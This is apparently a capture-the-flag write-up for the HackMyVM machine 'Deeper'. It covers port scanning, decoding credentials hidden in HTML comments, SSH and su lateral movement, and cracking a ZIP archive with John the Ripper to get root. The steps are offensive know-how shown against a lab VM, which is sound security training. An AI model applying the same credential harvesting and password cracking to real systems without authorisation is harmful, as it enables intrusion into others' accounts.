# Deeper

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Deeper | AceOmn | Beginner | HackMyVM |

**Summary:** The Deeper machine presents a layered exploitation chain built upon careless credential storage and weak access controls. The initial attack surface reveals a minimalist web interface with intentional HTML comments guiding attackers toward nested directories. By traversing through `/deeper/` and `/deeper/evendeeper/`, attackers discover credentials encoded in multiple formats—Morse code for the username ALICE and hexadecimal-encoded Base64 for her password. Upon obtaining SSH access as alice, enumeration uncovers a second user account, bob, whose credentials are similarly encoded within alice's home directory in the `.bob.txt` file. Through lateral movement to bob's account, attackers discover an encrypted ZIP archive containing the root password. The archive is protected by a weak password ("bob") which is quickly recovered via John the Ripper using the RockYou wordlist. The extracted root password ("IhateMyPassword") provides immediate privilege escalation to the root account, completing a full compromise of the system. This machine exemplifies how encoded rather than encrypted credentials, insufficient file permissions, and poor password practices create a cascading exploitation path from initial access to complete system compromise.

---

## Reconnaissance

### Network Discovery

The first step in any penetration test involves identifying active hosts on the target network. Using a network scanner, the target machine was identified at IP address 192.168.100.164:

```powershell
PS D:\hackmyvm\machines> D:\CTF_Tools\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.164 08:00:27:44:AD:E1 VirtualBox
```

### Service Enumeration

With the target IP identified, a comprehensive port scan was conducted to determine which services are running. An Nmap scan with script scanning and version detection reveals the attack surface:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/deeper]
└─$ nmap -sC -sV -p- -T4 192.168.100.164
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-14 09:26 WIB
Nmap scan report for 192.168.100.164
Host is up (0.0017s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
| ssh-hostkey:
|   256 37:d1:6f:b5:a4:96:e8:78:18:c7:77:d0:3e:20:4e:55 (ECDSA)
|_  256 cf:5d:90:f3:37:3f:a4:e2:ba:d5:d7:25:c6:4a:a0:61 (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: Deeper
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.60 seconds
```

The scan reveals two open ports: SSH on port 22 and HTTP on port 80. The target is a Debian Linux system running Apache httpd 2.4.57. Since no credentials are known at this stage, focus shifts to the web service for initial access.

### Web Application Analysis

Accessing the HTTP service via curl shows a minimalist landing page with an interesting HTML comment:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/deeper]
└─$ curl -s http://192.168.100.164
<!DOCTYPE html>
<html>
        <head>
                <title>
                        Deeper
                </title>
        </head>
        <body bgcolor="#101010"><center>

                <p>
                        <font size="6" color="ffa200">
                        Let's see where these lights lead...
                        <!-- GO "deeper" -->
                </font>
                </p>
                <p>
                        <img src="/img/index.jpg" width="960" height="640"/>
                        <br />
                        <font size="2" color="FFFFFF">
                        Photo by <a href="https://unsplash.com/@mischievous_penguins?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText">Casey Horner</a> on <a href="https://unsplash.com/photos/5p-3r7kBhKc?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText">Unsplash</a>
                        </font>
                </p>

        </center></body>
</html>
```

![](image.png)

The comment "GO 'deeper'" is a clear hint to explore subdirectories. The page displays an atmospheric image of a lit tunnel, which thematically aligns with the challenge of going progressively deeper into the system.

### Directory Traversal Discovery

Building on the hint from the HTML comment, accessing `/deeper/` reveals another layer:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/deeper]
└─$ curl -s http://192.168.100.164/deeper/
<!DOCTYPE html>
<html>
        <head>
                <title>
                        Deeper
                </title>
        </head>
        <body bgcolor="101010"><center>

                <p>
                        <font size="6" color="FFA200">
                        You have to go deeper
                </font>
                </p>
                <p>
                        <img src="/img/index2.jpg" width="960" height="640"/>
                        <br />
                        <font size="2" color="FFFFFF">
                        Photo by <a href="https://unsplash.com/@jorgerojas?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText">Jorge Rojas</a> on <a href="https://unsplash.com/photos/dbj0O83MM5Y?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText">Unsplash</a>
                        </font>
                </p>
                <!-- GO evendeeper -->
        </center></body>
</html>
```

The message reinforces the directive to continue traversing. The HTML comment now suggests "evendeeper" as the next target. Continuing the pattern:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/deeper]
└─$ curl -s http://192.168.100.164/deeper/evendeeper/
<!DOCTYPE html>
<html>
        <head>
                <title>
                        Deeper
                </title>
        </head>
        <body bgcolor="101010"><center>

                <p>
                        <font size="6" color="FFA200">
                        Now start digging
                </font>
                </p>
                <p>
                        <img src="/img/index3.jpg" width="960" height="640"/>
                        <br />
                        <font size="2" color="FFFFFF">
                        Photo by <a href="https://unsplash.com/@design_maffeisluca?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText">Luca Maffeis</a> on <a href="https://unsplash.com/photos/iY_cqJome-A?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText">Unsplash</a>
                        <!-- USER .- .-.. .. -.-. . -->
                        </font>
                </p>
        </center></body>
</html>
```

At this depth, a critical artifact appears: a Morse code string embedded in the HTML comment: `.- .-.. .. -.-. .`. Additionally, further down in the page source exists another encoded string.

### Credential Extraction from HTML Comments

The Morse code comment decodes to "ALICE", revealing the first username. Visual inspection with a Morse code decoder confirms this:

![](image-2.png)

The page source bottom also contains a hexadecimal-encoded value that, when decoded, reveals alice's password. This encoding uses Base64 wrapped in hexadecimal:

```
53586470624778486230526c5a58426c63673d3d
```

Decoding this hexadecimal string and then Base64 yields alice's password:

![](image-3.png)

The decoded password is "IwillGoDeeper".

---

## Initial Access

### SSH Authentication

With credentials now obtained (alice : IwillGoDeeper), establishing an SSH session is straightforward:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/deeper]
└─$ ssh alice@192.168.100.164
alice@192.168.100.164's password:
Linux deeper 6.1.0-11-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.38-4 (2023-08-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Aug 26 00:38:16 2023 from 192.168.100.103
alice@deeper:~$ id
uid=1000(alice) gid=1000(alice) groups=1000(alice)
alice@deeper:~$ ls -la
total 32
drwxr--r-- 3 alice alice 4096 Aug 26  2023 .
drwxr-xr-x 4 root  root  4096 Aug 25  2023 ..
lrwxrwxrwx 1 alice alice    9 Aug 25  2023 .bash_history -> /dev/null
-rw-r--r-- 1 alice alice  220 Aug 25  2023 .bash_logout
-rw-r--r-- 1 alice alice 3526 Aug 25  2023 .bashrc
-rw-r--r-- 1 alice alice   41 Aug 25  2023 .bob.txt
drwxr-xr-x 3 alice alice 4096 Aug 26  2023 .local
-rw-r--r-- 1 alice alice  807 Aug 25  2023 .profile
-rw-r--r-- 1 alice alice   33 Aug 26  2023 user.txt
```

Access has been successfully gained as alice. The user.txt flag is present but readable only by alice. Notably, a file named `.bob.txt` is visible, suggesting the next phase of privilege escalation involves accessing the bob user account.

---

## Internal Enumeration and Lateral Movement

### User Discovery

Examining the system's user database reveals the presence of two unprivileged users and the root account:

```bash
alice@deeper:~$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
alice:x:1000:1000:alice,,,:/home/alice:/bin/bash
bob:x:1001:1001:bob,,,:/home/bob:/bin/bash
```

The bob user exists on the system. An attempt to directly enumerate bob's home directory fails due to insufficient permissions:

```bash
alice@deeper:~$ ls -la /home/bob
ls: cannot access '/home/bob/.local': Permission denied
ls: cannot access '/home/bob/.bashrc': Permission denied
ls: cannot access '/home/bob/root.zip': Permission denied
ls: cannot access '/home/bob/.': Permission denied
ls: cannot access '/home/bob/..': Permission denied
ls: cannot access '/home/bob/.bash_history': Permission denied
ls: cannot access '/home/bob/.profile': Permission denied
ls: cannot access '/home/bob/.bash_logout': Permission denied
total 0
d????????? ? ? ? ?            ? .
d????????? ? ? ? ?            ? ..
l????????? ? ? ? ?            ? .bash_history
-????????? ? ? ? ?            ? .bash_logout
-????????? ? ? ? ?            ? .bashrc
d????????? ? ? ? ?            ? .local
-????????? ? ? ? ?            ? .profile
-????????? ? ? ? ?            ? root.zip
```

However, alice's home directory contains a file that hints at bob's credentials:

```bash
alice@deeper:~$ cat .bob.txt
535746745247566c634556756233566e61413d3d
```

This hexadecimal-encoded value follows the same encoding pattern as alice's password. Decoding via hex-to-ASCII and then Base64 reveals bob's password:

![](image-4.png)

The decoded password is "IamDeepEnough".

### Lateral Movement to Bob

With bob's credentials obtained, switching to the bob account is achieved via the `su` command:

```bash
alice@deeper:~$ su - bob
Password:
bob@deeper:~$ id
uid=1001(bob) gid=1001(bob) groups=1001(bob)
bob@deeper:~$ ls -la
total 28
drwxr--r-- 3 bob  bob  4096 Aug 26  2023 .
drwxr-xr-x 4 root root 4096 Aug 25  2023 ..
lrwxrwxrwx 1 bob  bob     9 Aug 25  2023 .bash_history -> /dev/null
-rw-r--r-- 1 bob  bob   220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 bob  bob  3526 Apr 23  2023 .bashrc
drwxr-xr-x 3 bob  bob  4096 Aug 25  2023 .local
-rw-r--r-- 1 bob  bob   807 Aug 26  2023 .profile
-rw-r--r-- 1 bob  bob   215 Aug 26  2023 root.zip
```

Success. Bob's home directory now contains the encrypted `root.zip` file that was previously inaccessible from alice's account. This archive likely contains the root password.

---

## Privilege Escalation

### Encrypted Archive Recovery

The `root.zip` file is protected by password encryption. An attempt to extract without a password fails:

```bash
bob@deeper:~$ which unzip
bob@deeper:~$ which python3
```

Since extraction tools are limited on the target system, the archive is transferred to the attacker's local machine via SCP:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/deeper]
└─$ scp bob@192.168.100.164:/home/bob/root.zip .
bob@192.168.100.164's password:
root.zip                                                 100%  215    66.5KB/s   00:00

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/deeper]
└─$ ls -la root.zip
-rw-r--r-- 1 ouba ouba 215 Apr 14 09:55 root.zip

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/deeper]
└─$ unzip root.zip
Archive:  root.zip
[root.zip] root.txt password:
   skipping: root.txt                incorrect password
```

The archive is password-protected and requires a password to extract.

### Password Cracking

The `zip2john` utility converts the ZIP file's encryption scheme into a format compatible with John the Ripper:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/deeper]
└─$ zip2john root.zip > hash
ver 1.0 efh 5455 efh 7875 root.zip/root.txt PKZIP Encr: 2b chk, TS_chk, cmplen=33, decmplen=21, crc=2D649941 ts=BA81 cs=ba81 type=0
```

John the Ripper is then applied using the RockYou wordlist, a comprehensive dictionary of previously compromised passwords:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/deeper]
└─$ john -w=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bob              (root.zip/root.txt)
1g 0:00:00:00 DONE (2026-04-14 09:56) 16.66g/s 409600p/s 409600c/s 409600C/s christal..280789
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

The password "bob" is rapidly discovered. This weak password provides immediate access to the encrypted archive.

### Root Credential Recovery

With the password obtained, the ZIP archive is now extractable:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/deeper]
└─$ unzip root.zip
Archive:  root.zip
[root.zip] root.txt password:
 extracting: root.txt

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/deeper]
└─$ cat root.txt
root:IhateMyPassword
```

The extracted file contains the root credentials: username "root" with password "IhateMyPassword".

### Root Access and System Compromise

With the root password now known, switching to the root account is achieved via the `su` command:

```bash
bob@deeper:~$ su - root
Password:
root@deeper:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
deeper
root@deeper:~# cat /home/alice/user.txt /root/root.txt
7e2[REDACTED]
dbc[REDACTED]
```

Full system compromise is achieved. Both the user flag (from alice's home directory) and the root flag (from the root account) are now accessible. The system is fully pwned.

---

## Attack Chain Summary

1. **Reconnaissance**: Port scanning identified SSH on port 22 and HTTP on port 80. Service enumeration confirmed Apache 2.4.57 running on a Debian Linux system, establishing the attack surface.

2. **Vulnerability Discovery**: HTML comments embedded within the web application source code provided explicit hints for directory traversal (`/deeper/`, `/deeper/evendeeper/`). These directories contained additional comments with encoded credentials using Morse code and hexadecimal-encoded Base64 encoding.

3. **Exploitation**: Credentials for the alice user were extracted by decoding the Morse code (revealing username ALICE) and decoding the hexadecimal-encoded Base64 string (revealing password IwillGoDeeper). SSH access was gained using these credentials.

4. **Internal Enumeration**: After gaining access as alice, file system enumeration revealed a second user account (bob) and a file within alice's home directory (`.bob.txt`) containing bob's encoded credentials. Following the same decoding process, bob's password (IamDeepEnough) was recovered.

5. **Privilege Escalation**: Lateral movement to the bob account granted access to an encrypted ZIP archive containing the root password. The archive's weak encryption password ("bob") was rapidly cracked using John the Ripper and the RockYou wordlist. The decrypted root password (IhateMyPassword) enabled direct root access, completing system compromise.

